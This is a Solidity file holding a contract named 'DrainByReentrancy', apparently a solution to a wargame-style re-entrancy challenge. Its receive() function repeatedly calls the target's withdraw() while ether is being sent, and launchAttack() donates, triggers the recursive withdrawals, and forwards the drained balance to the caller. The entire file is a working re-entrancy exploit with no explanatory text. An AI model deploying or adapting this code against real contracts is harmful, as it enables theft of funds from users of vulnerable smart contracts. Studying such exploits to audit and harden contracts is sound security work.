// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IReentrancy {
    function donate(address recipient) external payable;

    function withdraw(uint256 amount) external;

    function balanceOf(address account) external returns (uint256);
}

contract DrainByReentrancy {
    mapping(address => bool) internal _isReentrable;

    receive() external payable {
        if (msg.sender.balance != 0) {
            IReentrancy instance = IReentrancy(msg.sender);
            uint256 maxAmount = msg.sender.balance >= msg.value
                ? msg.value
                : msg.sender.balance;
            instance.withdraw(maxAmount);
        }
    }

    function launchAttack(address instance) external payable {
        uint256 minValue = instance.balance / 10;
        require(msg.value >= minValue, "Too much loop needed to drain value");
        IReentrancy(instance).donate{value: msg.value}(address(this));
        _isReentrable[msg.sender] = true;
        IReentrancy(instance).withdraw(msg.value);
        payable(msg.sender).call{value: address(this).balance}("");
    }
}